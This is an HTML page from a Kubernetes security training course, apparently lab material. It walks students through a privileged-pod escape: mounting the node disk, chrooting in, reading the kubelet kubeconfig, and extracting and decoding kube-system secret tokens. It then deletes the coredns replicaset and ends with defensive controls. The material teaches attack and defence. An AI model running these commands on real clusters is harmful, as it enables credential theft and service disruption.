@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: Kubernetes Node Attacks | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: Kubernetes Node Attacks" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/kubernetes-node-attacks/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/kubernetes-node-attacks/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: Kubernetes Node Attacks" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: Kubernetes Node Attacks","url":"http://0.0.0.0:10000/exercises/kubernetes-node-attacks/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: Kubernetes Node Attacks</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>Start a new bash shell</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash
+</code></pre></div></div>
+</li>
+<li>
+<p>(<em>NOTE: You'll only need to do this step if you skipped the <a href="/exercises/cloud-attacks/">Kubernetes Cloud Attacks</a> exercise</em>).</p>
+<p>The course proctors will provide you with a cloud cluster ID number (<code>N</code>). Store this number in your shell profile in a new variable <code>CLOUD_ID</code>, and then read this new variable into your environment now:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Replace the "N" in `CLOUD_ID=N` with the ID number provided by the proctors</span>
+<span class="nb">echo</span> <span class="s2">"export CLOUD_ID=N"</span> <span class="o">&gt;&gt;</span> ~/.bashrc
+<span class="nb">source</span> ~/.bashrc
+</code></pre></div></div>
+</li>
+<li>
+<p>We'll be using the same cloud cluster as in <a href="/exercises/cloud-attacks/">Kubernetes Cloud Attacks</a>, so let's set an <code>alias</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">unalias </span>kubectl
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"/root/K8S-Exercise/kubectl </span><span class="se">\</span><span class="s2">
+--server=</span><span class="si">$(</span><span class="nb">cat</span> /sync/.cloud_clusters/serverip-<span class="nv">$CLOUD_ID</span> <span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--token=</span><span class="si">$(</span><span class="nb">cat</span> /sync/.cloud_clusters/token-cluster-<span class="nv">$CLOUD_ID</span> <span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--certificate-authority=/sync/.cloud_clusters/ca.crt-</span><span class="nv">$CLOUD_ID</span><span class="s2">"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>And test that it works:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's launch a privileged pod. Let's ask kubectl to create a manifest for us:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl run priv <span class="nt">--image</span><span class="o">=</span>bustakube/alpine-small-attack <span class="se">\</span>
+  <span class="nt">--dry-run</span><span class="o">=</span>client <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>This outputs the <code>YAML</code> for a pod named <code>priv</code>, using the image <code>bustakube/alpine-small-attack</code> from Docker Hub.  Let's add a field to it, by telling <code>kubectl</code> to use JSON output instead, then using <code>jq</code> to set a value:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl run privpod <span class="nt">--image</span><span class="o">=</span>bustakube/alpine-small-attack <span class="se">\</span>
+  <span class="nt">--dry-run</span><span class="o">=</span>client <span class="nt">-o</span> json <span class="se">\</span>
+  | jq <span class="s1">'.spec.containers[0].securityContext.privileged=true'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>OK, now let's write that to a file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl run privpod <span class="nt">--image</span><span class="o">=</span>bustakube/alpine-small-attack <span class="se">\</span>
+  <span class="nt">--dry-run</span><span class="o">=</span>client <span class="nt">-o</span> json <span class="se">\</span>
+ | jq <span class="s1">'.spec.containers[0].securityContext.privileged=true'</span> <span class="se">\</span>
+  <span class="o">&gt;</span>pod-priv.json
+</code></pre></div></div>
+</li>
+<li>
+<p>And now let's create the pod with the file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create <span class="nt">-f</span> pod-priv.json
+</code></pre></div></div>
+</li>
+<li>
+<p>Wait for the pod to be ready:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">wait</span> <span class="nt">--for</span><span class="o">=</span><span class="nv">condition</span><span class="o">=</span>ready pod/privpod
+</code></pre></div></div>
+</li>
+<li>
+<p>Exec into your new pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec</span> <span class="nt">-it</span> privpod <span class="nt">--</span> /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>This pod is privileged, so it has access to a full set of devices:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /dev
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's mount the node's root drive - we have skipped trying other partitions and gone straight to the one that applies here:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount /dev/sda1 /mnt
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's copy <code>kubectl</code> from our pod into the node's filesystem:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/bin/kubectl /mnt/usr/bin/kubectl
+</code></pre></div></div>
+</li>
+<li>
+<p>Now <code>chroot</code> to the node's filesystem:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chroot</span> /mnt /bin/bash
+</code></pre></div></div>
+</li>
+<li>
+<p>You may have received an error message about how the shell (via groups) cannot look up the group ID 11.  That's ok.  It's a normal byproduct of chrooting.  Now that we have access to the host filesystem, let's take a look at the kubelet's directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /var/lib/kubelet
+</code></pre></div></div>
+</li>
+<li>
+<p>There's a <code>kubeconfig</code> file, which we can plug right into our <code>kubectl</code> command!</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /var/lib/kubelet/kubeconfig
+</code></pre></div></div>
+<p>(On newer versions of Kubernetes, we'll find this file in `/etc/kubernetes/kubelet.conf```)</p>
+</li>
+<li>
+<p>Now let's use it:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+
+kubectl <span class="nt">--kubeconfig</span><span class="o">=</span>/var/lib/kubelet/kubeconfig <span class="nt">-n</span> kube-system get secrets
+</code></pre></div></div>
+</li>
+<li>
+<p>To shorten the <code>kubectl</code> lines here, let's set an alias:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --kubeconfig=/var/lib/kubelet/kubeconfig"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>We're listing the secrets from the kube-system namespace, which contains the primary control plane elements for the cluster. Prove to yourself that we can see the contents of secrets:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> kube-system get secrets <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's get a significantly-privileged secret's JWT (JSON web token) - first get the token name for the deployment controller:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">secretname</span><span class="o">=</span><span class="si">$(</span>kubectl get secrets <span class="nt">-n</span> kube-system | <span class="se">\</span>
+  <span class="nb">awk</span> <span class="s1">'{print $1}'</span> | <span class="nb">grep </span>deployment-controller<span class="si">)</span>
+</code></pre></div></div>
+<p>Get the secret:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> kube-system get secret <span class="nv">$secretname</span> <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Store the token in a variable called <code>secret</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">secret</span><span class="o">=</span><span class="si">$(</span>kubectl <span class="nt">-n</span> kube-system get secret <span class="nv">$secretname</span> <span class="nt">-o</span> yaml  <span class="se">\</span>
+| <span class="nb">grep </span>token: | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>To use this token instead of the <code>kubeconfig</code> file, we'll need to get an API server IP address and certificate authority file. Start by getting the IP address from your environment variables:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">env</span> | <span class="nb">grep </span><span class="nv">KUBERNETES_PORT_443_TCP</span><span class="o">=</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Store that IP address in a variable:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ip</span><span class="o">=</span><span class="si">$(</span><span class="nb">env</span> | <span class="nb">grep </span><span class="nv">KUBERNETES_PORT_443_TCP</span><span class="o">=</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="se">\/</span> <span class="s1">'{print $3}'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's parse the certificate authority's cert out to <code>/ca.crt</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /var/lib/kubelet/kubeconfig  |grep  certificate-authority-data | <span class="se">\</span>
+  <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span>/ca.crt
+</code></pre></div></div>
+</li>
+<li>
+<p>Now let's use the token and just run <code>get pods</code> to keep things simple and check if it's all working:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"kubectl --token=</span><span class="nv">$secret</span><span class="s2"> --server=https://</span><span class="nv">$ip</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+  --certificate-authority=/ca.crt"</span>
+
+kubectl <span class="nt">-n</span> kube-system get pods
+</code></pre></div></div>
+</li>
+<li>
+<p>We are working with the JWT for the deployment-controller, which manages all pods launched via deployment. Use the token to list deployments:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> kube-system get deployments
+</code></pre></div></div>
+</li>
+<li>
+<p>If you want to prove to yourself that you really have some serious privilege, let's damage the cluster. Let's see what we are allowed to do:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> kube-system auth can-i <span class="nt">--list</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Every deployment creates replicasets. We can delete create and delete replicasets in the <code>kube-system</code> namespace and, for that matter, in any namespace.  We could delete the replicaset behind <code>kube-dns</code>.  Let's get its name:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> kube-system get replicasets
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's parse that name into a variable:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">rs</span><span class="o">=</span><span class="si">$(</span> kubectl <span class="nt">-n</span> kube-system get replicasets | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> | <span class="se">\</span>
+  egrep <span class="s1">'coredns-\w+$'</span> <span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's delete that <code>replicaset</code> and immediately after get a list of pods:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> kube-system delete replicaset <span class="nv">$rs</span>
+kubectl <span class="nt">-n</span> kube-system get pods | <span class="nb">grep </span>coredns
+</code></pre></div></div>
+</li>
+<li>
+<p>We see that some pods are terminating, while others are creating to replace them.  This is good - the deployment controller is recreating the destroyed replica set.</p>
+</li>
+<li>
+<p>This attack started with a pod that had a privileged container in it. Our goal in defending will be to prevent anyone from creating privileged containers. We can do this with Pod Security Policies/Standards, but also with third party admission controllers like Open Policy Agent (OPA) Gatekeeper, K-Rail, and Kyverno.</p>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
